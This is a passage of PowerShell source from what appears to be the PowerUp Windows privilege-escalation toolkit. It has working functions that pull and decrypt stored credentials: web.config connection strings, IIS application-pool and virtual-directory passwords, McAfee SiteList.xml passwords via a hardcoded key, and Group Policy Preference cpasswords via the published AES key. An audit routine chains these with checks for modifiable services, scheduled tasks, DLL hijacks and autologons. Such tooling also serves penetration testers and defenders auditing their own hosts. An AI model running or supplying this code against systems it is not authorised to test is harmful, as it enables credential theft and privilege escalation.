    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ScheduledTask')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $ScheduledTask
    )
    PROCESS {
        ForEach($Task in $ScheduledTask) {
            $ExecPath = $Task.'Task To Run'
            if( ($ExecPath -eq $null) -or ($ExecPath -eq "") -or ($ExecPath -eq "COM handler") ) {
                Write-Verbose "Skipping: $($Task.TaskName) [No Exec Path]"
                continue
            }
            $Count = 0
            $ExecPath | Get-ModifiablePath | ForEach-Object {
                $Count += 1
                $Task | Add-Member Noteproperty "ModifiablePath$Count" $_
            }
            if( $Task.ModifiablePath1 -ne $Null ) {
                $Task
            }
        }
    }
}   
function Get-UnattendedInstallFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }
    $ErrorActionPreference = $OrigError
}
function Get-WebConfig {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
        $DataTable = New-Object System.Data.DataTable
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {
            $CurrentVdir = $_
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
                $CurrentPath = $_.fullname
                [xml]$ConfigFile = Get-Content $_.fullname
                if ($ConfigFile.configuration.connectionStrings.add) {
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {
                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }
                        Copy-Item $CurrentPath $WebConfigPath
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath
                        if ($TMPConfigFile.configuration.connectionStrings.add) {
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }
        if ( $DataTable.rows.Count -gt 0 ) {
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-ApplicationHost {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        $DataTable = New-Object System.Data.DataTable
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
            $PoolName = $_
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
            $VdirName = $_
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }
        if ( $DataTable.rows.Count -gt 0 ) {
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-SiteListPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )
    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $B64Pass
            )
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }
            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }
        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $Path
            )
            try {
                [Xml]$SiteListXml = Get-Content -Path $Path
                if ($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"
                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'
                            if ($_.Password.Encrypted -eq 1) {
                                $DecPassword = if ($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }
                            $Server = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }
                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            $Out = New-Object -TypeName PSObject -Property $ObjectProperties
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
                            $Out
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }
        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -Path $_.Fullname
        }
    }
}
function Get-CachedGPPPassword {
    [CmdletBinding()]
    Param()
    Set-StrictMode -Version 2
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )
        try {
            $Mod = ($Cpassword.length % 4)
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }
            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }
        catch {
            Write-Error $Error[0]
        }
    }
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )
        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
            if ($Xml.innerxml -like "*cpassword*"){
                Write-Verbose "Potential password in $File"
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }
           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               $Password += , $DecryptedPassword
           }
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }
        catch {Write-Error $Error[0]}
    }
    try {
        $AllUsers = $Env:ALLUSERSPROFILE
        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }
    catch {
        Write-Error $Error[0]
    }
}
function Invoke-PrivescAudit {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $Format = 'List',
        [Switch]
        $HTMLReport
    )
    if($HTMLReport){ $Format = 'HTML' }
    if ($Format -eq 'HTML') {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }
    Write-Host "[+] Running Invoke-PrivescAudit"
    Write-Host "[+] Enumerating services. This may take some time... "
    Write-Host "[+]     Enumerating services via registry... " -NoNewline
    $S1 = Get-ServiceReg
    Write-Host "done. [$($S1.Length) services found]"
    Write-Host "[+]     Enumerating services via WMI... " -NoNewline
    $S2 = Get-ServiceWmi
    Write-Host "done. [$($S2.Length) services found]"
    Write-Host "[+]     Enumerating services via Advapi32... " -NoNewline
    $S3 = Get-ServiceApi
    Write-Host "done. [$($S3.Length) services found]"
    $Services = $S1 + $S2 + $S3
    $Services = $Services | Group-Object "Name","Dacl" | ForEach-Object {$_.Group | Select -First 1}
    Write-Host "[+] $($Services.Length) unique services identified."
    Write-Host "[+] Running Privilege Escalation Checks.`n"
    $Checks = @(
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
            Command     = { if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -Special | Where-Object {$_} }
        },
        @{
            Type    = 'Unquoted Service Paths'
            Command = { $Services | Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { $Services | Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { $Services | Test-ServiceDaclPermission }
        },
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
        },
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Modifiable Scheduled Task Files2'
            Command = { Get-ScheduledTasks | Get-ModifiableScheduledTaskFile2 }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Modifiable Registry Service Keys'
            Command = { Get-ModifiableRegistryService }
        }
    )
    ForEach($Check in $Checks){
        if( $PSBoundParameters['Verbose'] ) {
            $Results = . $Check.Command -Verbose
        } else {
            $Results = . $Check.Command
        }
        $Results | Where-Object {$_} | ForEach-Object {
            $_ | Add-Member Noteproperty 'Check' $Check.Type -Force
        }
        switch($Format){
            Object { $Results }
            List   { "[*] Checking for $($Check.Type)..."; $Results | Format-List }
            HTML   { $Results | ConvertTo-HTML -Head $Header -Body "<H2>$($Check.Type)</H2>" | Out-File -Append $HtmlReportFile }
        }
    }
    if ($Format -eq 'HTML') {
        Write-Verbose "[*] Report written to '$HtmlReportFile' `n"
    }
}
$Module = New-InMemoryModule -ModuleName PowerUpModule
$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceConfig ([Bool]) @([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError -Charset Unicode),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -Bitfield
$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -Bitfield
$LuidAttributes = psenum $Module PowerUp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -Bitfield
$SecurityEntity = psenum $Module PowerUp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}
$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}
$TOKEN_TYPE_ENUM = psenum $Module PowerUp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}
$TOKEN_TYPE = struct $Module PowerUp.TokenType @{
    Type  = field 0 $TOKEN_TYPE_ENUM
}
$SECURITY_IMPERSONATION_LEVEL_ENUM = psenum $Module PowerUp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}
$IMPERSONATION_LEVEL = struct $Module PowerUp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM
}
$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}
$LUID = struct $Module PowerUp.Luid @{
    LowPart         =   field 0 $SecurityEntity
    HighPart        =   field 1 Int32
}
$LUID_AND_ATTRIBUTES = struct $Module PowerUp.LuidAndAttributes @{
    Luid         =   field 0 $LUID
    Attributes   =   field 1 UInt32
}
$TOKEN_PRIVILEGES = struct $Module PowerUp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}
$SERVICE_INFORMATION = struct $Module PowerUp.ServiceInformation @{
        dwServiceType       = field 0 Uint32
        dwStartType         = field 1 Uint32
        dwErrorControl      = field 2 Uint32
        lpBinaryPathName    = field 3 String -MarshalAs LPWSt
        lpLoadOrderGroup    = field 4 String -MarshalAs LPWSt
        dwTagID             = field 5 Uint32
        lpDependencies      = field 6 String -MarshalAs LPWSt
        lpServiceStartName  = field 7 String -MarshalAs LPWSt
        lpDisplayName       = field 8 String -MarshalAs LPWSt
}
$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$NTDll    = $Types['ntdll']
Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
